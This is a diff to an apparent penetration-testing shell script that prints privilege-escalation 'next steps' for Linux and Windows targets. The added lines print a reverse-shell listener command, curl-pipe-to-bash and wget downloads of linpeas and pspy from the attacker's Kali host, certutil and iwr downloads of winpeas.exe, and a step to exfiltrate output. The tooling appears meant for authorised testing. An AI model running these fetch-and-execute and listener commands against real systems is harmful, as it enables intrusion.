@@ -1897,12 +1897,31 @@ main() {
     echo ""
     success "Output directory: $target_dir"
     success "Commands file:    $target_dir/commands.txt"
+
+    local _kali_ip_final
+    _kali_ip_final=$(get_kali_ip)
+
+    echo -e "\n[NEXT STEPS]"
+    echo "  1. Start listener NOW — before running enum commands on target:"
+    echo "     penelope -p 4444 -O"
     echo ""
-    info "Next steps:"
-    echo -e "  1. Transfer tools to target using commands above"
-    echo -e "  2. Run enumeration commands from ${BOLD}$target_dir/commands.txt${NC}"
-    echo -e "  3. Transfer output file to Kali, then parse: ${BOLD}./escalatr.sh --parse <output_file>${NC}"
-    echo -e "  4. Check quick-wins report for prioritized findings"
+    echo "  2. Transfer tools to target (HTTP server running on port ${HTTP_PORT}):"
+    if [[ "$target_os" == "linux" ]]; then
+        echo "     curl http://${_kali_ip_final}:${HTTP_PORT}/linpeas.sh | bash"
+        echo "     wget http://${_kali_ip_final}:${HTTP_PORT}/pspy64 -O /tmp/pspy64 && chmod +x /tmp/pspy64"
+    else
+        echo "     iwr -uri http://${_kali_ip_final}:${HTTP_PORT}/winpeas.exe -OutFile C:\\Users\\Public\\winpeas.exe"
+        echo "     certutil -urlcache -split -f http://${_kali_ip_final}:${HTTP_PORT}/winpeas.exe C:\\Users\\Public\\winpeas.exe"
+    fi
+    echo ""
+    echo "  3. Run generated commands on target:"
+    echo "     # Copy-paste from: $target_dir/commands.txt"
+    echo ""
+    echo "  4. Exfil output back to Kali, then parse:"
+    echo "     ./escalatr.sh --parse <output_file> --os ${target_os}"
+    echo ""
+    echo "  5. Read prioritised findings:"
+    echo "     cat $target_dir/attack_commands.txt"
     echo ""
 
     # Potato guide reminder for Windows
